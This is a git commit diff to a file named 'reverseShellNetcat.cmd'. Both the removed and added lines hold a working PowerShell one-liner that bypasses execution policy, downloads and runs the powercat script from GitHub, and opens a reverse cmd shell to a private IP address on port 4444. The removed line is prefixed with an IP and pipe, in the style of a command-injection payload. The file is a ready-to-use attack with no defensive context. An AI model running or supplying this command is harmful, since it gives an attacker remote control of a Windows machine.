3a225d3c295a43a06fda891dd1b560e8e001709c
minhlqhe140825 <75994996+minhlqhe140825@users.noreply.github.com>
2021-09-13 06:31:58 -0400

    Update reverseShellNetcat.cmd

--- reverseShellNetcat.cmd
+++ reverseShellNetcat.cmd
@@ -1,1 +1,1 @@
-8.8.8.8 |powershell -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'));powercat -c 192.168.5.131 -p 4444 -e cmd"
+powershell -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'));powercat -c 192.168.5.131 -p 4444 -e cmd"
